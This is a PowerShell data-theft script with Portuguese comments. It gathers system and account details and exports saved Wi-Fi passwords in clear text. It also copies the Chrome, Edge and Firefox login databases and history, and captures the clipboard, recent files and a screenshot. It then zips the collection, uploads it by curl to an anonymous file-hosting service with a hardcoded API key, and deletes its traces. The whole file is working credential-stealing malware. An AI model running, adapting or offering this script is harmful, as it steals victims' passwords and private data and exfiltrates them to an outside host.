# ---------- KIT v5.5 – COMPLETO, sem corrupção, upload garantido ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$upUrl   = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
$logFile = "$env:TEMP\kit_log.txt"

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

Write-Log "[START] KIT iniciado em $env:COMPUTERNAME\$env:USERNAME"
New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Sistema & HW
Write-Log "[INFO] Coletando sistema e hardware..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Write-Log "[INFO] Exportando perfis Wi-Fi..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios
Write-Log "[INFO] Listando usuários e admins..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    Write-Log "[WARN] Log 'Security' indisponível (rode como Admin ou habilite audit)."
    "Log Security não disponível" | Out-File "$kit\logons.txt" -Encoding UTF8
}

# 4) Navegadores
Write-Log "[INFO] Copiando dados de navegadores..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

# 5) Certificados
Write-Log "[INFO] Exportando certificados pessoais..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard
Write-Log "[INFO] Capturando clipboard..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Recentes
Write-Log "[INFO] Listando arquivos recentes..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Screenshot
Write-Log "[INFO] Tirando screenshot..."
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

# 9) Compactação
Write-Log "[INFO] Compactando pacote..."
$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length bytes)"

# 10) Upload – URL garantida + escape para cmd
Write-Log "[UP] Enviando para AnonFiles..."
Write-Log "[UP] URL usada: $upUrl"
try {
    $reply = cmd /c "curl.exe -s -X POST -H `\"Content-Type: multipart/form-data`\" -F `\"file=@$zip;type=application/zip`\" $upUrl"
    Write-Log "[UP] Resposta bruta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[OK] Upload finalizado – link: $($matches[1])"
    } else {
        Write-Log "[ERRO] Falha ao obter URL pública"
    }
} catch {
    Write-Log "[ERRO] Exceção no upload: $_"
}

# 11) Limpeza
Write-Log "[CLEAN] Removendo pasta temporária..."
Remove-Item $kit -Recurse -Force
Write-Log "[END] KIT finalizado. Log completo em $logFile"
